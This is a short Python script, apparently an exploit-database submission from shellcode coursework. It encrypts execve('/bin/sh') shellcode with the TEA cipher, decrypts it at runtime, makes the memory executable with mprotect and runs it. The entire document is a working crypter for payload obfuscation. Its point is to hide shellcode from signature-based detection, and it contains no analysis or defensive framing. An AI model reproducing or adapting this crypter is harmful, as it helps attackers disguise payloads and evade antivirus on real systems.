#  
# Title: TEA crypter and decrypter
# Shellcode: execve('/bin/sh', 0, 0)
# Date: 2019-02-01
# Author: Kiewicz (@_Kiewicz)
# Homepage: https://0xkiewicz.github.io
# Tested on: Debian/x86
# python crypter.py 
# PA-7854
#
import ctypes
from pytea import TEA
from time import sleep

# 16 bytes long
key = b'slaeisthebest!!!'
tea = TEA(key)

# execve('/bin/sh',0,0)
shellcode_data  = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
encrypted = tea.encrypt(shellcode_data)
print('Encrypted hex:', encrypted.hex())
sleep(1)
print('Decrypting and running...')
sleep(1)
decrypted = tea.decrypt(encrypted)

# Run shellcode
shellcode = ctypes.create_string_buffer(bytes(decrypted))
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
        assert libc.mprotect(page_start, pagesize, 0x7) == 0

        function()
